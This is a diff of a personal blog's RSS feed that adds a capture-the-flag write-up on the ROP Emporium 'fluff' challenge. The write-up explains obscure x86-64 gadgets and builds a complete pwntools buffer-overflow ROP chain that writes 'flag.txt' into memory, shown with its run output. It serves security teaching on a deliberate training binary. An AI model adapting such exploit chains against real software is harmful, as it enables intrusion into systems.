@@ -4,9 +4,263 @@
         <description><![CDATA[Markel's blog, mainly focused on Computer Science but also about other topics.]]></description>
         <link>https://markelmencia.github.io</link>
         <generator>RSS for Node</generator>
-        <lastBuildDate>Sun, 21 Dec 2025 10:45:30 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 26 Dec 2025 23:16:29 GMT</lastBuildDate>
         <atom:link href="https://markelmencia.github.io/rss.xml" rel="self" type="application/rss+xml"/>
         <language><![CDATA[en]]></language>
+        <item>
+            <title><![CDATA[ROP Emporium x86-64 Challenge 6: fluff]]></title>
+            <description><![CDATA[<h1>ROP Emporium x86-64 Challenge 6: fluff</h1>
+<h4>December 26, 2025</h4>
+<p>Brace yourself for this one; although conceptually this challenge is nothing new, we'll have to get creative.</p>
+<p>The description tells us that this challenge is not very different from the [write4] challenge. We just need to call the <code>print_file</code> function in the binary with <code>flag.txt</code> as the argument. With all of this said, let's just jump right into it.</p>
+<p>Let's start just like we've done until now, checking the functions in the binary:</p>
+<pre><code>pwndbg> info functions
+0x00000000004004d0  _init
+0x0000000000400500  pwnme@plt
+0x0000000000400510  print_file@plt
+0x0000000000400520  _start
+0x0000000000400550  _dl_relocate_static_pie
+0x0000000000400560  deregister_tm_clones
+0x0000000000400590  register_tm_clones
+0x00000000004005d0  __do_global_dtors_aux
+0x0000000000400600  frame_dummy
+0x0000000000400607  main
+0x0000000000400617  usefulFunction
+0x0000000000400628  questionableGadgets
+0x0000000000400640  __libc_csu_init
+0x00000000004006b0  __libc_csu_fini
+0x00000000004006b4  _fini
+</code></pre>
+<p>Exactly the same as the write4 challenge, except from one function: <code>questionableGadgets</code>. Well, let's rip the band aid right off and disassemble it.</p>
+<pre><code>pwndbg> disas questionableGadgets
+   0x0000000000400628 &#x3C;+0>:	    xlat   BYTE PTR ds:[rbx]
+   0x0000000000400629 &#x3C;+1>:	    ret
+   0x000000000040062a &#x3C;+2>:	    pop    rdx
+   0x000000000040062b &#x3C;+3>:	    pop    rcx
+   0x000000000040062c &#x3C;+4>:	    add    rcx,0x3ef2
+   0x0000000000400633 &#x3C;+11>:	bextr  rbx,rcx,rdx
+   0x0000000000400638 &#x3C;+16>:	ret
+   0x0000000000400639 &#x3C;+17>:	stos   BYTE PTR es:[rdi],al
+   0x000000000040063a &#x3C;+18>:	ret
+   0x000000000040063b &#x3C;+19>:	nop    DWORD PTR [rax+rax*1+0x0]
+
+</code></pre>
+<p>Right.</p>
+<p>We have three gadgets here (one for each <code>ret</code> function). Don't worry, it's perfectly normal to not understand a single gadget in here. Let's go through each one of them carefully.</p>
+<h2>The <code>xlat</code> gadget</h2>
+<pre><code>xlat    BYTE PTR ds:[rbx]
+ret
+</code></pre>
+<p><code>xlat</code> is an instruction that involves two registers: <code>al</code> and <code>rbx</code>. The value of <code>rbx</code> should be a pointer to an array in memory (in theory it should be a table, but for what we'll use it to, we might as well call it an array). The value of <code>al</code> should be an index in that array.</p>
+<p>What <code>xlat</code> does is replace the value of <code>al</code> to the byte stored in whatever index of the array was stored in <code>al</code> before the instruction. Let's see an example.</p>
+<pre><code>0xAEAE: 'h'  0xAEAF: 'e' 0xAEB0: 'y'  0xAEB1: '\0'
+
+BEFORE XLAT:
+RBX: 0xAEAE (Points to the first element of the array)
+AL: 1
+
+AFTER XLAT:
+RBX: 0xAEAE
+AL: 65 ('e' in ASCII, the character in index 1 of the array)
+</code></pre>
+<p>We have an array with the elements <code>['h', 'e', 'y', '\0']</code> in it, <code>rbx</code> pointing to the beginning of that array and <code>al</code> with <code>1</code> stored in it. When <code>xlat</code> is executed, the value of <code>al</code> will change to whatever value its index was pointing to. In this case, it was pointing to the index <code>1</code>, so its value will now be 65, which represents the letter 'e' in ASCII.</p>
+<h2>The <code>bextr</code> gadget</h2>
+<p>This one is the most obscure gadget of the three. It works with three registers: <code>rbx</code>, <code>rcx</code> and <code>rdx</code>.</p>
+<p><code>bextr</code> performs an extraction. It reads a source value, stored in <code>rcx</code>, and with some control bits in <code>rdx</code> (we'll see later), it will copy a chunk of the bits into <code>rbx</code>. Let's see an example:</p>
+<pre><code>RCX: 1100 0100 1110 1010 (source)
+RDX: 0x0804 (Start at bit 4 and extract 8 bits)
+RBX: 0100 1110
+</code></pre>
+<p>The only important bytes in <code>rdx</code> are the first four. The first two declare the starting bit and the next two declare the amount of bits that will be copied into <code>rbx</code>.</p>
+<p>To make matters worse, this gadget also executes an <code>add</code> instruction before <code>bextr</code>:</p>
+<pre><code>   0x000000000040062a &#x3C;+2>:	pop    rdx
+   0x000000000040062b &#x3C;+3>:	pop    rcx
+   0x000000000040062c &#x3C;+4>:	add    rcx,0x3ef2
+   0x0000000000400633 &#x3C;+11>:	bextr  rbx,rcx,rdx
+</code></pre>
+<p>We'll have to work around that somehow. At least the gadget allows us to pop values into the registers the instruction uses.</p>
+<h2>The <code>stos</code> gadget</h2>
+<p><code>stos</code> is actually very simple to understand, and very useful for this challenge. In simple terms, it just stores the byte stored in <code>AL</code> in the address in memory specified in <code>rdi</code>. It also modifies <code>rdi</code> according to a program flag value, but we don't need to worry about that. Here's an example:</p>
+<pre><code>0xAEAE: 0x2341
+
+AL: 61
+RDI: 0xAEAE
+
+After executing stos:
+OxAEAE: 61
+</code></pre>
+<h2>The strategy</h2>
+<p>With these gadgets, there is a way to arbitrarily store data in memory. This is useful because we want to have a string in memory we can use as an argument for <code>print_file</code>. In other words, we can write <code>flag.txt</code> in memory with these gadgets. But the strategy is everything but intuitive.</p>
+<p>With the <code>bextr</code> gadget, we can store an arbitrary value in <code>rbx</code>. This is good, because the <code>xlat</code> instruction uses the <code>rbx</code> register as a pointer.</p>
+<p>Considering the fact that we have full control of what can be stored in <code>rbx</code>, we can point to anywhere in memory if we want to, which in theory allows us to store any value we want in <code>al</code>. There's a caveat with this though, but let's go one issue at a time. Having control of  <code>al</code> is useful too, because <code>stos</code> will store whatever byte is stored in <code>al</code> in memory (assuming we can also control <code>rdi</code> with another gadget. Spoiler: we can).</p>
+<p>To sum up, arbitrary writing in memory <em>is</em> possible with these gadgets. But the way in which this is achieved is very difficult to visualize. I'll try my best to explain the loop needed for the exploit:</p>
+<ol>
+<li>We write <code>flag.txt</code> in the garbage section of the buffer overflow (the place in which in previous challenges we've written 'A's to reach the return address offset).</li>
+<li>Using <code>bextr</code>, we write in <code>rbx</code> the address of the section in which <code>flag.txt</code> is (with an adjustment to make sure <code>xlat</code> takes the proper byte, we'll see later).</li>
+<li>With the adjusted pointer in <code>rbx</code>, we execute the <code>xlat</code> gadget to store one byte of <code>flag.txt</code>. This adjustment is needed because the index that <code>xlat</code> will take is stored in <code>al</code> too. We have no direct way of controlling what value is in this register before getting here, so for each byte we take, we'll have to calculate an offset for <code>rbx</code>.</li>
+<li>Once we have the byte we want stored in <code>al</code>, we can store it somewhere else with <code>stos</code>. Usually we do this in the <code>bss</code> section of the binary.</li>
+<li>We do this in loop until we write the last "t" of "flag.txt". After that, we can use a <code>pop rdi; ret</code> gadget to then execute <code>print_file</code> and read the flag.</li>
+</ol>
+<p>That was a handful... It took a lot of pondering to get this right. Before we get to the exploit building, let's talk about the offset I mentioned in step 2 and 3.</p>
+<h2>The <code>rbx</code> offset</h2>
+<p>There are a few issues with making sure that the proper pointer is stored in <code>rbx</code>. Remember the <code>add</code> instruction in the <code>bextr</code> gadget?</p>
+<pre><code>   0x000000000040062a &#x3C;+2>:	    pop    rdx
+   0x000000000040062b &#x3C;+3>:	    pop    rcx
+   0x000000000040062c &#x3C;+4>:	    add    rcx,0x3ef2
+   0x0000000000400633 &#x3C;+11>:	bextr  rbx,rcx,rdx
+</code></pre>
+<p>Whatever value we store in <code>rcx</code>, <code>0x3ef2</code> will be added to it. We have to take this into account:</p>
+<pre><code>rbx_offset = -0x3ef2
+</code></pre>
+<p>Then, as I've mentioned, this strategy is operated in a loop, for every character <code>flag.txt</code> has. This means that for every character we go through, we'll have to increment by one the starting address of the <code>flag.txt</code> pointer:</p>
+<pre><code>rbx_offset = -0x3ef2 + i
+</code></pre>
+<p>And now, the cherry on top. Since the value stored in the register <code>al</code> after executing <code>xlat</code> depends on <code>al</code> as well, and also considering the fact that there is no other way for us to arbitrarily modify <code>al</code> with any other gadget, we will have to take into account the value of <code>al</code> <em>before</em> we perform our exploit. This can easily be checked with a breakpoint right before the <code>ret</code> instruction of the <code>pwnme</code> function. It turns out that the value of <code>al</code> is <code>11</code>, so we'll have to subtract <code>11</code> from the pointer, because <code>al</code> will go into the index <code>11</code> from the starting point of the array pointer. Which means that, for example, if the byte we want to store in <code>al</code> is in the index 0 of the array <code>0xAEAE</code>, the pointer in <code>rbx</code> should be <code>0xAEAE - 11</code>.</p>
+<pre><code>rbx_offset = -0x3ef2 + i - 11
+</code></pre>
+<p>But there's more! We have to consider the next iterations! Once we store in <code>al</code> the first byte of <code>flag.txt</code>  (the character <code>f</code>, 102 in ASCII), we'll have to subtract <code>102</code> from the offset, not <code>11</code>. And we'll have to consider the next iterations as well! Let's take this into account in code:</p>
+<pre><code>FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
+al_offset = 11 # Initial value of al
+
+rbx_offset = -0x3ef2 + i - al_offset
+al_offset = ord[flag_text[i]] # Gets the ASCII value of the character
+</code></pre>
+<p>Pwning is hard.</p>
+<p>At least that's the climax in terms of understanding the strategy. With this in mind, we can begin building the payload.</p>
+<h2>The payload</h2>
+<p>Like we always do, let's begin with defining some variables:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+OVERFLOWED_BUFFER_ADDRESS = 0x7fffffffdc30
+
+BEXTR_GADGET_ADDRESS = 0x0000040062A
+XLAT_GADGET_ADDRESS = 0x0000000400628
+STOS_GADGET_ADDRESS = 0x0000000000400639
+POP_RDI_GADGET_ADDRESS = 0x004006a3
+PRINT_FILE_FUNCTION_ADDRESS = 0x400510
+BSS_ADDRESS = 0x0000000000601038
+
+FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
+al_offset = 11
+</code></pre>
+<p>The offset was obtained the same way as in the other challenges. The pointer to the overflowed buffer (the buffer that we overflow in <code>pwnme</code>) was obtained by adding a breakpoint in the <code>read</code> function in <code>pwnme</code>. Once you stop in there, pwndbg prints out in which pointer will <code>read</code> write your input. That's the buffer.  The <code>bss</code> pointer was obtained with <code>info files</code>. The <code>bss</code> area is one in which we have write permissions. Perfect to store arbitrary values in.</p>
+<p>With the variables out of the way, let's assemble our <code>payload</code> variable.</p>
+<p>First, we set up the offset. As we've said, we'll write <code>flag.txt</code> in it, and then as many A's as we need to get to the return address, just like we've done in the other challenges:</p>
+<pre><code>payload = b"flag.txt" + b"A"*(OFFSET - 8) # 8 = length of flag.txt
+</code></pre>
+<p>Now we can start the loop. Since <code>flag.txt</code> has 8 characters, and we can copy one character to memory at a time, we'll have to execute this loop eight times. The first thing we'll do in every iteration is calculate the <code>rbx</code> offset:</p>
+<pre><code>for i in range(8):
+	rbx_offset = -0x3ef2 + i - al_offset
+</code></pre>
+<p>Now we need to run the <code>bextr</code> gadget. In <code>rdx</code>, the control register, we'll set the starting address to <code>0x00</code> and the length of the extraction to <code>0xFF</code>, meaning that we'll copy the whole register into <code>rbx</code>. In <code>rcx</code>, we'll push <code>OVERFLOWED_BUFFER_ADDRESS + rbx_offset</code>, so it can be copied into <code>rbx</code>:</p>
+<pre><code>for i in range(8):
+	rbx_offset = -0x3ef2 + i - al_offset
+	payload += p64(BEXTR_GADGET_ADDRESS)
+	payload += p64(0xFF00) # rdx
+	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset)
+</code></pre>
+<p>This will write in <code>rbx</code> our adjusted pointer, ready for <code>xlat</code> to read into it:</p>
+<pre><code>for i in range(8):
+	rbx_offset = -0x3ef2 + i - al_offset
+	payload += p64(BEXTR_GADGET_ADDRESS)
+	payload += p64(0xFF00) # rdx
+	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
+	payload += p64(XLAT_GADGET_ADDRESS)
+</code></pre>
+<p>After this, <code>al</code> will contain whatever character of <code>flag.txt</code> the iteration is on. All we need to do is store it in <code>bss</code>, with the <code>pop rdi; ret</code> gadget I've found with the <code>rop</code> command and the <code>stos</code> gadget:</p>
+<pre><code>for i in range(8):
+	rbx_offset = -0x3ef2 + i - al_offset
+	payload += p64(BEXTR_GADGET_ADDRESS)
+	payload += p64(0xFF00) # rdx
+	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
+	
+	payload += p64(XLAT_GADGET_ADDRESS)
+	payload += p64(POP_RDI_GADGET_ADDRESS)
+	payload += p64(BSS_ADDRESS + i) # rdi
+	payload += p64(STOS_GADGET_ADDRESS)
+</code></pre>
+<p>We add <code>i</code> to it because we don't want to keep overwriting the same byte in <code>bss</code>.</p>
+<p>After <code>stos</code>, all we need to do is update <code>al_offset</code>:</p>
+<pre><code>for i in range(8):
+	rbx_offset = -0x3ef2 + i - al_offset
+	payload += p64(BEXTR_GADGET_ADDRESS)
+	payload += p64(0xFF00) # rdx
+	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
+	
+	payload += p64(XLAT_GADGET_ADDRESS)
+	payload += p64(POP_RDI_GADGET_ADDRESS)
+	payload += p64(BSS_ADDRESS + i) # rdi
+	payload += p64(STOS_GADGET_ADDRESS)
+	
+	al_offset = ord(FLAG_TEXT[i])
+</code></pre>
+<p>The loop is done! When this loop ends, the <code>flag.txt</code> string will be written into <code>bss</code>. All we need to do now is call <code>print_file</code> with the pointer to <code>flag.txt</code> as an argument. This can be done with the <code>pop rdi; ret</code> gadget too:</p>
+<pre><code>payload += p64(POP_RDI_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS) # rdi
+payload += p64(PRINT_FILE_FUNCTION_ADDRESS)
+</code></pre>
+<p>The payload is done! Now we just write it into a file to use is as input, and the script is done! Here's the whole thing:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+OVERFLOWED_BUFFER_ADDRESS = 0x7fffffffdc10
+
+BEXTR_GADGET_ADDRESS = 0x0000040062A
+XLAT_GADGET_ADDRESS = 0x0000000400628
+STOS_GADGET_ADDRESS = 0x0000000000400639
+POP_RDI_GADGET_ADDRESS = 0x004006a3
+PRINT_FILE_FUNCTION_ADDRESS = 0x400510
+BSS_ADDRESS = 0x0000000000601038
+
+FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
+al_offset = 11
+
+
+payload  = b"flag.txt" + b"A"*(OFFSET - 8) # 8 = length of flag.txt
+for i in range(8):
+	rbx_offset = -0x3ef2 + i - al_offset
+	payload += p64(BEXTR_GADGET_ADDRESS)
+	payload += p64(0xFF00) # rdx
+	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
+	
+	payload += p64(XLAT_GADGET_ADDRESS)
+	payload += p64(POP_RDI_GADGET_ADDRESS)
+	payload += p64(BSS_ADDRESS + i) # rdi
+	payload += p64(STOS_GADGET_ADDRESS)
+	
+	al_offset = ord(FLAG_TEXT[i])
+
+payload += p64(POP_RDI_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS) # rdi
+payload += p64(PRINT_FILE_FUNCTION_ADDRESS)
+
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>This solution, if executed normally, will throw a segmentation fault before printing the flag. However, if we execute it inside pwndbg, we'll be able to read the file before it segfaults. With this said, let's run the exploit:</p>
+<pre><code>$ python3 exploit.py
+$ pwndbg fluff
+pwndbg> run &#x3C; exploit
+fluff by ROP Emporium
+x86_64
+
+You know changing these strings means I have to rewrite my solutions...
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+
+Program received signal SIGSEGV, Segmentation fault.
+</code></pre>
+<h2>A few (very interesting!) things</h2>
+<p>The fact that this solution works is nothing short of a miracle, and I mean this. First, this payload doesn't need stack aligning to work, which is already a feat by itself. Second, and most importantly, this payload is <strong>exactly</strong> as big as the number of bytes that the <code>read</code> function in <code>pwnme</code> reads. This means that if you add just one more address to the payload, it won't be read by <code>read</code> and it will not show up in the overflowed buffer, rendering that address, gadget or pointer completely useless.</p>
+<p>I found out this the hard way, when after figuring out the trick and building the payload, I realized that the last two addresses I added into the buffer just weren't there when I ran the binary. I was ready to give up (by that time I had already spent a few hours with the challenge) when, to my amazement, removing the two stack alignments I coded in the payload gave me no issues, other than probably that fact that that's why the program segfaults at the end. That sure was a roller-coaster of emotions.</p>
+<p>On another note, you might have noticed something fishy. In the beginning of the exploit, when we write in the characters to reach the return address offset, I write <code>flag.txt</code> in there. Well, isn't that writing in memory already? Why do you need to build that shoddy payload just to write <code>flag.txt</code> again but in <code>bss</code>? That's exactly what I asked myself much before I came up with the solution I present in this writeup.</p>
+<p>That's right, you can just write <code>flag.txt</code> in the buffer (plus a null character as a delimiter), then all the other garbage characters until the return address and then the <code>pop rdi; ret</code> gadget along with the address to the buffer to then call <code>print_file</code> to print the flag. It's a perfectly possible solution. However, had you stopped there and not come up with the complicated solution, you wouldn't have learnt as much, right?</p>
+<p>Actually, there are ways in which you can read the flag without even having to write any special string in the buffer overflow. <a href="https://github.com/shero4/ROP-Emporium-2020-writeup/blob/master/fluff/exploit.py">This writeup does it</a>, it's a very smart solution that I really like. This approach is more solid than mine, and it probably works better under more strict environments. I could've written that solution in this writeup, but I didn't want to. In the end, this is the solution I came up with. It took me a lot of work, and honestly, I'm quite proud of it! The fact that it barely works, and that it's pretty much a miracle that it does, makes me feel like it's worth sharing (and that it's pretty funny), because it goes to show that when it comes down to capturing flags, any solution within the rules is valid, no matter how cluttery, weird or inconsistent. Pwning can be very difficult and unintuitive, and each person has their own ways of going around the pond!</p>
+]]></description>
+            <link>https://markelmencia.github.io/writeups/rop-emporium-fluff-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.github.io/writeups/rop-emporium-fluff-writeup</guid>
+            <pubDate>Fri, 26 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
         <item>
             <title><![CDATA[TSG CTF 2025 Writeup: global_writer [Pwn]]]></title>
             <description><![CDATA[<h1>TSG CTF 2025 Writeup: global_writer [Pwn]</h1>
@@ -242,6 +496,7 @@ TSGCTF{6O7_4nd_6lob4l_v4r1able5_ar3_4dj4c3n7_1n_m3m0ry_67216011}
         <item>
             <title><![CDATA[How to perform a simple buffer overflow]]></title>
             <description><![CDATA[<h1>How to perform a simple buffer overflow</h1>
+<h4>December 18, 2025</h4>
 <p>Buffer Overflow attacks are one of the most common types of attacks, and it has been so for the last decade. Unfortunately, they tend to be quite powerful, granting in some cases full system control to the attacker due to how close to the bare-metal these attacks tend to be performed on. BOFs have been in the cybersecurity scene for decades, giving headaches to security experts and full-on companies alike. And even if language compilers have worked to prevent these attacks and many tools have been developed to detect related issues, buffer overflows are definitely still a thing of the present.</p>
 <p>Knowing how these vulnerabilities are created, or at least understanding their roots is knowledge that might be quite useful for any developer, even if they are not specialized in the cybersecurity space.</p>
 <p>As I'll be participating in a CTF competition this weekend, I decided to refresh my memory on how these vulnerabilities come to be, because I find them very interesting. As I've mentioned, they are quite close to the bare-metal (in order to perform a buffer overflow attack, we'll need to be in contact with assembly!). Because of this, it can be overwhelming to perform a BOF attack (let alone understand it). Moreover, there are many tools to choose from. This is why I'm writing this. This is a small tutorial in which I'll show how an attack is done from scratch. Let's get on with it!</p>
@@ -415,7 +670,7 @@ Found at offset 24
 0x00401016 : ret
 ...
 </code></pre>
-<p><code>rop</code> will print quite a few useful addresses we might need for other programs, but for this one we just need one that has "ret" on it. Let's write this address too. Now we are ready to build the exploit string.</p>
+<p><code>rop</code> will print quite a few useful addresses we might need for other programs called "gadgets", but for this one we just need one that has "ret" on it. Let's write this address too. Now we are ready to build the exploit string.</p>
 <h2>Creating the exploit string</h2>
 <p>We'll use pwntools for this, and a simple python script:</p>
 <pre><code class="language-python">from pwn import *
@@ -518,7 +773,7 @@ $
         <item>
             <title><![CDATA[Break The Syntax 2025: crypto/Roulette]]></title>
             <description><![CDATA[<h1>Break The Syntax CTF 2025: crypto/roulette</h1>
-<h2>Overview</h2>
+<h4>May 31, 2025</h4>
 <p>This challenge simulates a "Provably Fair Roulette". In order to interact with the challenge we have to connect to the server that runs it. To get the flag, according to the given description, <strong>we must get the number 13 a total of 37 times in a row</strong>. To do so, we are given the code that runs in the server.</p>
 <h2>Objective</h2>
 <p>Somehow manipulate our interaction with the server to <strong>hardcode the number 13 as the resulting number</strong> of the roulette.</p>
@@ -846,11 +1101,11 @@ if __name__ == "__main__":
         <item>
             <title><![CDATA[UMDCTF 2025: misc/find the seeds]]></title>
             <description><![CDATA[<h1>UMDCTF 2025: misc/find the seeds</h1>
+<h4>April 30, 2025</h4>
 <ul>
 <li><strong>Name:</strong> find the seeds</li>
 <li><strong>Description:</strong> can u help Alice find her seeds in the bin? She's pretty sure the bin hasn't been dumped since it was generated.</li>
 </ul>
-<h2>Overview</h2>
 <p>In this challenge, we are given two files: a <strong>binary</strong> file (secret.bin) and a <strong>Python script</strong> (secret.py). Let's quickly check the binary file with <code>xxd</code>, which will allow us to see the <strong>hexadecimal data</strong> of the file:</p>
 <pre><code>$ xxd secret.bin
 00000000: 1047 a8b7 cafc c837 fc9d 71b2 bf29 dd08  .G.....7..q..)..
